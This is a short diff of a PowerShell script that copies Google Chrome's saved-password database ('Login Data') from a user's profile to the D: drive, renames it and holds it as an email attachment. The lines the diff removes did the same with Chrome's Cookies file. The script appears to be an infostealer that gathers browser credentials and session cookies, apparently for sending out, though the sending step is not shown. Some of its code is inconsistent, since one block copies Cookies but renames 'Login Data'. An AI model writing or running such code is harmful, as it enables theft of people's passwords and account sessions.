@@ -20,16 +20,6 @@ if (Test-Path C:\Users\$username\AppData\Local\Google\Chrome\User` Data\Default\
 	$Attachment1 = "D:\ChromeDataD"
 	
 }
-
-if (Test-Path C:\Users\$username\AppData\Local\Google\Chrome\User` Data\Default\Cookies)
-{
-	$chromeD="C:\Users\"+$username+"\AppData\Local\Google\Chrome\User Data\Default\Cookies";
-	$path1=1
-	copy-item -path $chromeD -destination D:/
-	Rename-Item D:\Login` Data ChromeDataDee
-	$Attachment1 = "D:\ChromeDataDee"
-	
-}
 	
 
 if (Test-Path C:\Users\$username\AppData\Local\Google\Chrome\User` Data\Profile` 1\Login` Data)
